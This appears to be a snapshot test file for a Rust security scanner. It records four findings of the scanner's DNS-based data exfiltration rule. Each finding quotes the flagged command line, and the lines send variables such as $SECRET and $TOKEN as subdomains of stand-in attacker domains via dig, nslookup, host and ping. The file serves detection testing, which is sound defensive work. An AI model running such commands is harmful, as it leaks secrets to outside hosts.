@@ -1,0 +1,50 @@
+---
+source: src/rules/builtin/exfiltration.rs
+expression: findings
+---
+[
+  {
+    "id": "EX-003",
+    "severity": "high",
+    "category": "exfiltration",
+    "confidence": "tentative",
+    "name": "DNS-based data exfiltration",
+    "line": 5,
+    "code": "dig $DATA.evil.com",
+    "message": "Potential DNS-based data exfiltration: data encoded in DNS query detected",
+    "recommendation": "Review DNS queries and ensure they are not being used to exfiltrate data"
+  },
+  {
+    "id": "EX-003",
+    "severity": "high",
+    "category": "exfiltration",
+    "confidence": "tentative",
+    "name": "DNS-based data exfiltration",
+    "line": 6,
+    "code": "nslookup $SECRET.attacker.io",
+    "message": "Potential DNS-based data exfiltration: data encoded in DNS query detected",
+    "recommendation": "Review DNS queries and ensure they are not being used to exfiltrate data"
+  },
+  {
+    "id": "EX-003",
+    "severity": "high",
+    "category": "exfiltration",
+    "confidence": "tentative",
+    "name": "DNS-based data exfiltration",
+    "line": 7,
+    "code": "host $ENCODED.malicious.net",
+    "message": "Potential DNS-based data exfiltration: data encoded in DNS query detected",
+    "recommendation": "Review DNS queries and ensure they are not being used to exfiltrate data"
+  },
+  {
+    "id": "EX-003",
+    "severity": "high",
+    "category": "exfiltration",
+    "confidence": "tentative",
+    "name": "DNS-based data exfiltration",
+    "line": 8,
+    "code": "ping $TOKEN.evil.org",
+    "message": "Potential DNS-based data exfiltration: data encoded in DNS query detected",
+    "recommendation": "Review DNS queries and ensure they are not being used to exfiltrate data"
+  }
+]
